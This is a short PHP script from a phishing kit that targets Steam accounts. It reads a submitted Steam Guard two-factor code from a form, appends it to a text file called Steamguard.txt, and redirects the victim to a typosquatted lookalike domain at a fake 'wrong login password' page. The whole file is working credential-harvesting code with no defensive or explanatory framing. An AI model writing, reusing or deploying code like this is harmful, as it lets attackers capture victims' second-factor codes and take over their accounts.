<?php
$guard = $_POST['guard'];
$log = fopen("Steamguard.txt","at");
fwrite($log,"Steamguard = $guard \n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content='0; URL=https://steeeamcommunity.000webhostapp.com/wrongloginpassword'></head></html>";
?>